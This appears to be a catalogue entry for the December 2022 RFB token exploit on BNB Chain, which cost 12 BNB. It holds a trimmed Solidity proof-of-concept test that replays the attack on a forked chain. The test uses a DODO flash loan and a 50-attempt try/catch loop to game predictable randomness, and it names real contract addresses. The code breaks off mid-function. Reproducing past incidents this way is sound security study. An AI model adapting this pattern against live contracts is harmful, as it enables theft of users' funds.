# [?] - RFB - Predicting Random Numbers

## Summary
Severity: Unknown
Chain: BNB Chain
Component: RFB
Published: 2022-12-05
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/RFB_exp.sol
Type: defi-exploit-poc

## Details
Lost: 12BNB
References:
- https://twitter.com/BlockSecTeam/status/1599991294947778560
- https://bscscan.com/tx/0xcc8fdb3c6af8bb9dfd87e913b743a13bbf138a143c27e0f387037887d28e3c7a

```solidity
contract ContractTest is Test {
    IERC20 RFB = IERC20(0x26f1457f067bF26881F311833391b52cA871a4b5);
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x03184AAA6Ad4F7BE876423D9967d1467220a544e);
    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 23_649_423);
    }

    function testExploit() public payable {
        RFB.approve(address(Router), type(uint256).max);
        WBNB.approve(address(Router), type(uint256).max);
        payable(address(uint160(0))).transfer(address(this).balance);
        DVM(dodo).flashLoan(20 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        WBNB.withdraw(20 * 1e18);
        for (uint256 i = 0; i < 50; i++) {
            try this.check(20 * 1e18 - i) {}
            catch {
                continue;
            }
        }
        WBNB.deposit{value: address(this).balance}();
        WBNB.transfer(dodo, 20 * 1e18);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/RFB_exp.sol_
